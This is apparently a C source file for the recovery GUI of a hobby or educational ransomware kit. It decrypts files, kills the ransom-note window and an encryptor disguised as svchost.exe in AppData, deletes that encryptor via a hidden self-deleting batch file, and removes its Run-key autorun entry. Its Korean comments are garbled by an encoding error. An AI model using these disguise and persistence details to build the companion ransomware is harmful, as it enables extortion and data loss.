#define _CRT_SECURE_NO_WARNINGS
#define _WIN32_IE 0x0400
#define _WIN32_WINNT 0x0501

#include <windows.h>
#include <shlobj.h>         // SHGetFolderPathW
#include <tlhelp32.h>
#include <stdio.h>
#include <psapi.h>  // GetModuleFileNameExW
#include "decryptor.h"
#include "walker.h"

#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Shfolder.lib")
#pragma comment(lib, "Psapi.lib")

#define AES_KEY_SIZE 32
#define IV_SIZE 16
#define IDC_STATIC_TEXT 1001
#define IDC_BTN_DECRYPT 1003
#define IDC_EDIT_LOGBOX 1004

HFONT hFont;
HINSTANCE hInst;

// �α� ��� �Լ� (�ڵ� �ٹٲ� ����)
void append_log(HWND hwnd, const wchar_t* msg) {
    HWND hLogBox = GetDlgItem(hwnd, IDC_EDIT_LOGBOX);
    if (!hLogBox) return;

    int len = GetWindowTextLengthW(hLogBox);
    SendMessageW(hLogBox, EM_SETSEL, len, len);

    wchar_t full_msg[1024];
    swprintf(full_msg, 1024, L"%s\r\n", msg);  // �ٹٲ� �ڵ� �߰�

    SendMessageW(hLogBox, EM_REPLACESEL, FALSE, (LPARAM)full_msg);
}

// encryptor.exe ���μ����� ã�� ����
void kill_encryptor_process() {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"encryptor.exe") == 0 ||
                _wcsicmp(pe.szExeFile, L"svchost.exe") == 0) {

                HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (hProc) {
                    WCHAR path[MAX_PATH];
                    if (GetModuleFileNameExW(hProc, NULL, path, MAX_PATH)) {
                        // �츮�� ����� encryptor�� ���� (��� ���� �˻�)
                        if (wcsstr(path, L"winupdater\\svchost.exe")) {
                            TerminateProcess(hProc, 0);
                            append_log(NULL, L"[INFO] �������� ���μ��� �����");
                        }
                    }
                    CloseHandle(hProc);
                }
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
}

void remove_autorun_registry(HWND hwnd) {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {

        LONG result = RegDeleteValueW(hKey, L"WinUpdater");
        if (result == ERROR_SUCCESS) {
            append_log(hwnd, L"[INFO] autorun ������Ʈ�� ���� �Ϸ�");
        }
        else if (result == ERROR_FILE_NOT_FOUND) {
            append_log(hwnd, L"[INFO] autorun ������Ʈ�� �׸� ���� (�̹� ���ŵ�)");
        }
        else {
            append_log(hwnd, L"[ERROR] ������Ʈ�� ���� ����");
        }

        RegCloseKey(hKey);
    }
    else {
        append_log(hwnd, L"[ERROR] ������Ʈ�� ��� ���� ����");
    }
}


void delete_encryptor_via_batch() {
    WCHAR appdata[MAX_PATH];
    WCHAR target_path[MAX_PATH], bat_path[MAX_PATH];

    // 1. AppData ��� �޾ƿ���
    SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdata);

    // 2. ��� encryptor ���
    wsprintfW(target_path, L"%s\\winupdater\\svchost.exe", appdata);

    // 3. delself.bat ���� ���
    wsprintfW(bat_path, L"%s\\winupdater\\delself.bat", appdata);

    // 4. ��ġ���� ����
    FILE* fp = _wfopen(bat_path, L"w");
    if (fp) {
        fwprintf(fp,
            L":Repeat\n"
            L"del \"%s\"\n"
            L"if exist \"%s\" goto Repeat\n"
            L"del \"%%~f0\"\n",
            target_path, target_path);
        fclose(fp);

        // 5. ���� ����
        ShellExecuteW(NULL, L"open", bat_path, NULL, NULL, SW_HIDE);
    }
}

// ��ȣȭ + ��ó��
void do_decrypt(HWND hwnd) {
    append_log(hwnd, L"[INFO] ��ȣȭ ���� ��...");

    int count = decrypt_all_files();  // ��ȣȭ ����

    if (count > 0) {
        wchar_t buf[128];
        swprintf(buf, 128, L"[INFO] �� %d���� ������ ��ȣȭ�߽��ϴ�.", count);
        append_log(hwnd, buf);

        SetWindowTextW(GetDlgItem(hwnd, IDC_STATIC_TEXT),
            L"��ȣȭ �Ϸ�. â�� �� ����˴ϴ�...");

        HWND ransomWnd = FindWindowW(L"RansomNoteWindow", NULL);
        if (ransomWnd) {
            DWORD pid = 0;
            GetWindowThreadProcessId(ransomWnd, &pid);
            if (pid != 0) {
                HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
                if (hProc) {
                    TerminateProcess(hProc, 0);
                    CloseHandle(hProc);
                    append_log(hwnd, L"[INFO] ������Ʈ ���� �Ϸ�");
                }
            }
        }

        kill_encryptor_process();
        append_log(hwnd, L"[INFO] encryptor.exe ���μ��� ���� �õ�");

        append_log(hwnd, L"[INFO] encryptor.exe ���� ���� ����");
        delete_encryptor_via_batch();  // ��ġ���Ϸ� ���� ����
        append_log(hwnd, L"[INFO] encryptor.exe ���� ���� �Ϸ� (���� �� �ڵ� ���ŵ�)");

        remove_autorun_registry(hwnd);
        append_log(hwnd, L"[INFO] �ڵ����� ������Ʈ�� ���ŵ�");

        append_log(hwnd, L"[INFO] ���α׷��� 3�� �� ����˴ϴ�...");
        Sleep(3000);
        PostQuitMessage(0);

    }
    else {
        append_log(hwnd, L"[INFO] ��ȣȭ�� ������ �����ϴ�.");
        MessageBoxW(hwnd, L"��ȣȭ�� ������ �����ϴ�.", L"����", MB_ICONERROR);
    }
}


// ��ư/GUI ó��
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_CREATE:
        hFont = CreateFontW(
            18, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI");

        CreateWindowW(L"static", L"��ȣȭ ��ư�� ���� ������ ��ȣȭ�ϼ���.",
            WS_VISIBLE | WS_CHILD,
            40, 30, 500, 24,
            hwnd, (HMENU)IDC_STATIC_TEXT, hInst, NULL);

        CreateWindowW(L"button", L"��ȣȭ ����",
            WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
            220, 70, 140, 35,
            hwnd, (HMENU)IDC_BTN_DECRYPT, hInst, NULL);

        CreateWindowW(L"edit", L"",
            WS_VISIBLE | WS_CHILD | WS_BORDER | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY,
            40, 120, 500, 100,
            hwnd, (HMENU)IDC_EDIT_LOGBOX, hInst, NULL);

        // ��ü ��Ʈ ����
        for (int id = IDC_STATIC_TEXT; id <= IDC_EDIT_LOGBOX; id++) {
            HWND hCtl = GetDlgItem(hwnd, id);
            if (hCtl) SendMessageW(hCtl, WM_SETFONT, (WPARAM)hFont, TRUE);
        }
        break;

    case WM_COMMAND:
        if (LOWORD(wParam) == IDC_BTN_DECRYPT) {
            do_decrypt(hwnd);
        }
        break;

    case WM_DESTROY:
        DeleteObject(hFont);
        PostQuitMessage(0);
        break;

    default:
        return DefWindowProcW(hwnd, msg, wParam, lParam);
    }
    return 0;
}

// ������
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    PWSTR lpCmdLine, int nCmdShow) {
    hInst = hInstance;

    WNDCLASSW wc = { 0 };
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L"DecryptorWindow";
    wc.hIcon = LoadIconW(NULL, IDI_APPLICATION);  // �⺻ ������
    RegisterClassW(&wc);

    HWND hwnd = CreateWindowW(
        L"DecryptorWindow", L"��ȣȭ �����",
        WS_OVERLAPPEDWINDOW & ~(WS_MAXIMIZEBOX | WS_THICKFRAME),
        CW_USEDEFAULT, CW_USEDEFAULT, 600, 280,
        NULL, NULL, hInstance, NULL);

    if (!hwnd) return 0;

    ShowWindow(hwnd, nCmdShow);
    UpdateWindow(hwnd);

    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    return (int)msg.wParam;
}
